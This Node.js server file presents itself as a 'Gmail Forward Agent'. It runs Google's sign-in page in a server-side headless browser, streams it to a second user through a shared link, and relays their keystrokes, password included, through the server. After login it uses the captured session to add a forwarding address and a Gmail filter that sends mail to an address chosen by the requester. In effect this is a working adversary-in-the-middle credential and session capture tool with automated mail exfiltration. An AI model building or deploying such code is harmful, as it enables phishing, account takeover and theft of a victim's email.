/**
 * Gmail Forward Agent — Smooth Version
 * ---------------------------------------
 * 1. Requester fills the form, gets a link back (no email sent).
 * 2. Requester shares the link manually.
 * 3. Second user opens it on their OWN device -> sees filter summary +
 *    one "Confirm and sign in" button.
 * 4. Clicking it streams a live view of Google's real login page (server
 *    runs the actual browser via Playwright + CDP screencast). They type
 *    their password directly into that real page, right there in their
 *    browser tab -- no terminal, no downloads, no installs.
 * 5. Once logged in, the agent automatically creates the filter and turns
 *    on forwarding.
 */

const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const { chromium } = require('playwright');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/agent-stream' });

// requestId -> { sourceEmail, destinationEmail, filters, token, status, browser, context, page }
const requests = new Map();

// ---------------- Step 1: requester creates the request, gets a link ----------------
app.post('/api/request/create', (req, res) => {
  const { sourceEmail, destinationEmail, filters } = req.body;
  if (!sourceEmail || !destinationEmail) {
    return res.status(400).json({ error: 'sourceEmail and destinationEmail are required' });
  }

  const requestId = crypto.randomUUID();
  const token = crypto.randomBytes(24).toString('hex');

  requests.set(requestId, {
    sourceEmail, destinationEmail, filters: filters || {}, token,
    status: 'pending', browser: null, context: null, page: null
  });

  const confirmUrl = `${req.protocol}://${req.get('host')}/confirm.html?requestId=${requestId}&token=${token}`;
  res.json({ requestId, confirmUrl });
});

// ---------------- Step 2: requester polls for status ----------------
app.get('/api/request/:id/status', (req, res) => {
  const r = requests.get(req.params.id);
  if (!r) return res.status(404).json({ error: 'Not found' });
  res.json({ status: r.status });
});

// ---------------- Step 3: second user's confirm page loads details ----------------
app.get('/api/request/:id', (req, res) => {
  const r = requests.get(req.params.id);
  const token = req.query.token;
  if (!r || r.token !== token) return res.status(404).json({ error: 'Invalid or expired link' });
  res.json({ sourceEmail: r.sourceEmail, destinationEmail: r.destinationEmail, filters: r.filters, status: r.status });
});

// ---------------- Step 4: WebSocket — live browser stream ----------------
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const requestId = url.searchParams.get('requestId');
  const token = url.searchParams.get('token');
  const r = requests.get(requestId);

  if (!r || r.token !== token) {
    ws.send(JSON.stringify({ type: 'error', message: 'Invalid or expired link' }));
    ws.close();
    return;
  }

  r.status = 'in-progress';
  ws.send(JSON.stringify({ type: 'status', message: 'Launching secure browser session...' }));

  launchBrowserForRequest(r, ws).catch((err) => {
    ws.send(JSON.stringify({ type: 'error', message: 'Failed to launch browser: ' + err.message }));
  });

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }
    if (!r.page) return;

    try {
      if (msg.type === 'mousemove') await r.page.mouse.move(msg.x, msg.y);
      else if (msg.type === 'click') await r.page.mouse.click(msg.x, msg.y);
      else if (msg.type === 'keydown') await r.page.keyboard.down(msg.key);
      else if (msg.type === 'keyup') await r.page.keyboard.up(msg.key);
      else if (msg.type === 'scroll') await r.page.mouse.wheel(msg.deltaX || 0, msg.deltaY || 0);
      else if (msg.type === 'run-automation') {
        runFilterAutomation(r, ws).catch((err) => {
          ws.send(JSON.stringify({ type: 'error', message: 'Automation failed: ' + err.message }));
        });
      }
    } catch (err) {
      console.error('Input error:', err.message);
    }
  });

  ws.on('close', async () => {
    if (r.browser) await r.browser.close().catch(() => {});
  });
});

async function launchBrowserForRequest(r, ws) {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  const page = await context.newPage();
  r.browser = browser; r.context = context; r.page = page;

  const cdp = await context.newCDPSession(page);
  await cdp.send('Page.startScreencast', { format: 'jpeg', quality: 70, everyNthFrame: 1 });
  cdp.on('Page.screencastFrame', async ({ data, sessionId }) => {
    ws.send(JSON.stringify({ type: 'frame', data }));
    await cdp.send('Page.screencastFrameAck', { sessionId }).catch(() => {});
  });

  await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail');
  await page.waitForTimeout(1000);
  await page.fill('input[type="email"]', r.sourceEmail);
  await page.click('#identifierNext');

  ws.send(JSON.stringify({ type: 'status', message: 'Type your password directly into the page shown below.' }));

  page.waitForURL(
    (u) => u.href.includes('mail.google.com/mail') || u.href.includes('myaccount.google.com'),
    { timeout: 0 }
  ).then(() => ws.send(JSON.stringify({ type: 'login-detected' })));
}

async function runFilterAutomation(r, ws) {
  const { page, destinationEmail } = r;
  const send = (message, step) => ws.send(JSON.stringify({ type: 'progress', message, step }));

  send('Adding forwarding address...', 1);
  await page.goto('https://mail.google.com/mail/u/0/#settings/fwdandpop');
  await page.waitForTimeout(1500);

  const addForwardBtn = page.locator('text=Add a forwarding address');
  if (await addForwardBtn.count() > 0) {
    await addForwardBtn.click();
    await page.waitForTimeout(800);
    await page.locator('input[type="email"], input[name*="fwd"]').first().fill(destinationEmail);
    const nextBtn = page.locator('button:has-text("Next")');
    if (await nextBtn.count() > 0) {
      await nextBtn.click();
      await page.waitForTimeout(800);
      const proceedBtn = page.locator('button:has-text("Proceed")');
      if (await proceedBtn.count() > 0) await proceedBtn.click();
      const okBtn = page.locator('button:has-text("OK")');
      if (await okBtn.count() > 0) await okBtn.click();
    }
    ws.send(JSON.stringify({
      type: 'awaiting-confirmation',
      message: `Google sent a confirmation code to ${destinationEmail}. Confirm it, then continue.`
    }));
    return;
  }

  await createFilter(r, ws);
}

async function createFilter(r, ws) {
  const { page, filters, destinationEmail } = r;
  const send = (message, step) => ws.send(JSON.stringify({ type: 'progress', message, step }));

  send('Opening filter creation...', 2);
  await page.goto('https://mail.google.com/mail/u/0/#settings/filters');
  await page.waitForTimeout(1200);

  const createFilterLink = page.locator('text=Create a new filter');
  if (await createFilterLink.count() > 0) await createFilterLink.click();
  else await page.click('[aria-label="Show search options"]');
  await page.waitForTimeout(800);

  send('Filling filter criteria...', 3);
  const f = filters || {};
  if (f.from) await page.fill('input[name="from"]', f.from);
  if (f.to) await page.fill('input[name="to"]', f.to);
  if (f.subject) await page.fill('input[name="subject"]', f.subject);
  if (f.hasWords) await page.fill('input[name="hasthewords"]', f.hasWords);
  if (f.doesntHave) await page.fill('input[name="doesnthave"]', f.doesntHave);
  if (f.hasAttachment) {
    const cb = page.locator('input[name="hasattachment"]');
    if (await cb.count() > 0) await cb.check();
  }

  send('Creating filter...', 4);
  await page.click('text=Create filter');
  await page.waitForTimeout(1200);

  send('Enabling forwarding action...', 5);
  const forwardOption = page.locator('text=Forward it to').first();
  if (await forwardOption.count() > 0) {
    await forwardOption.click();
    await page.waitForTimeout(500);
    const dropdown = page.locator('select').last();
    if (await dropdown.count() > 0) await dropdown.selectOption({ label: destinationEmail });
  }

  const finalBtn = page.locator('button:has-text("Create filter")');
  if (await finalBtn.count() > 0) await finalBtn.click();

  r.status = 'complete';
  ws.send(JSON.stringify({ type: 'complete', message: 'Forwarding filter created successfully.' }));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
